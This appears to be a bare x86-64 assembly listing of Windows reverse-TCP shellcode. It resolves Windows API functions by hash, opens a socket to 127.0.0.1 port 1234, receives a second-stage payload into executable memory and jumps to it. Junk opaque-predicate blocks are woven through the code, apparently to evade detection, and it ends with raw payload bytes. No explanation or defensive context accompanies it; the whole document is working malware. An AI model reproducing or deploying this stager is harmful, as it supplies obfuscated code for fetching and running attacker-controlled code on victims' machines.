```asm
_start:
    cld
    and rsp, 0xfffffffffffffff0
    call L_d6
RET_a:
    push r9
    pushfq
    push rax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov rdx, rdx
real_1:
    pop rax
    popfq
    push r8
    push rdx
    xor rdx, rdx
    push rcx
    mov rdx, qword ptr gs:[rdx + 0x60]
    push rsi
    mov rdx, qword ptr [rdx + 0x18]
    mov rdx, qword ptr [rdx + 0x20]
    pushfq
    push rax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov rdx, rdx
real_2:
    pop rax
    popfq
L_21:
    movzx rcx, word ptr [rdx + 0x4a]
    mov rsi, qword ptr [rdx + 0x50]
    xor r9, r9
    pushfq
    push rax
    xor eax, eax
    jnz bogus_3
    jmp real_3
bogus_3:
    nop
    mov rdx, rdx
real_3:
    pop rax
    popfq
L_2d:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_37
    sub al, 0x20
    pushfq
    push rax
    xor eax, eax
    jnz bogus_4
    jmp real_4
bogus_4:
    nop
    mov rdx, rdx
real_4:
    pop rax
    popfq
L_37:
    ror r9d, 0xd
    add r9d, eax
    loop L_2d
    push rdx
    mov rdx, qword ptr [rdx + 0x20]
    push r9
    mov eax, dword ptr [rdx + 0x3c]
    add rax, rdx
    cmp word ptr [rax + 0x18], 0x20b
    jne L_cb
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_cb
    add rax, rdx
    push rax
    mov ecx, dword ptr [rax + 0x18]
    mov r8d, dword ptr [rax + 0x20]
    add r8, rdx
    pushfq
    push rax
    xor eax, eax
    jnz bogus_5
    jmp real_5
bogus_5:
    nop
    mov rdx, rdx
real_5:
    pop rax
    popfq
L_72:
    jrcxz L_ca
    dec rcx
    xor r9, r9
    mov esi, dword ptr [r8 + rcx*4]
    add rsi, rdx
    pushfq
    push rax
    xor eax, eax
    jnz bogus_6
    jmp real_6
bogus_6:
    nop
    mov rdx, rdx
real_6:
    pop rax
    popfq
L_81:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    ror r9d, 0xd
    add r9d, eax
    cmp al, ah
    jne L_81
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_72
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    pop r8
    pop r8
    add rax, rdx
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_ca:
    pop rax
    pushfq
    push rax
    xor eax, eax
    jnz bogus_7
    jmp real_7
bogus_7:
    nop
    mov rdx, rdx
real_7:
    pop rax
    popfq
L_cb:
    pop r9
    pop rdx
    mov rdx, qword ptr [rdx]
    jmp L_21
L_d6:
    pop rbp
    movabs r14, 0x32335f327377
    push r14
    mov r14, rsp
    sub rsp, 0x1a0
    pushfq
    push rax
    xor eax, eax
    jnz bogus_10
    jmp real_10
bogus_10:
    nop
    mov rdx, rdx
real_10:
    pop rax
    popfq
    mov r13, rsp
    movabs r12, 0x100007fd2040002
    push r12
    mov r12, rsp
    mov rcx, r14
    mov r10d, 0x726774c
    call rbp
    mov rdx, r13
    push 0x101
    pop rcx
    mov r10d, 0x6b8029
    call rbp
    push 0xa
    pop r14
    push rax
    push rax
    xor r9, r9
    xor r8, r8
    inc rax
    mov rdx, rax
    inc rax
    mov rcx, rax
    mov r10d, 0xe0df0fea
    call rbp
    mov rdi, rax
    pushfq
    push rax
    xor eax, eax
    jnz bogus_8
    jmp real_8
bogus_8:
    nop
    mov rdx, rdx
real_8:
    pop rax
    popfq
L_13e:
    push 0x10
    pop r8
    mov rdx, r12
    mov rcx, rdi
    mov r10d, 0x6174a599
    call rbp
    test eax, eax
    je L_15e
    dec r14
    jne L_13e
    pushfq
    push rax
    xor eax, eax
    jnz bogus_9
    jmp real_9
bogus_9:
    nop
    mov rdx, rdx
real_9:
    pop rax
    popfq
    call L_21a
L_15e:
    xor r9, r9
    push 0x10
    pop r8
    call L_17a
    .byte 0x1f, 0xbf, 0x70, 0x2b, 0x5f, 0x90, 0x50, 0x19, 0x06, 0x53, 0x07, 0x51, 0x6e, 0x58, 0xa5, 0xf9, 0x5a, 0x48, 0x89, 0xf9, 0x49, 0xc7, 0xc2, 0xc2, 0xeb, 0x38, 0x5f, 0xff, 0xd5, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41, 0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x13, 0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
```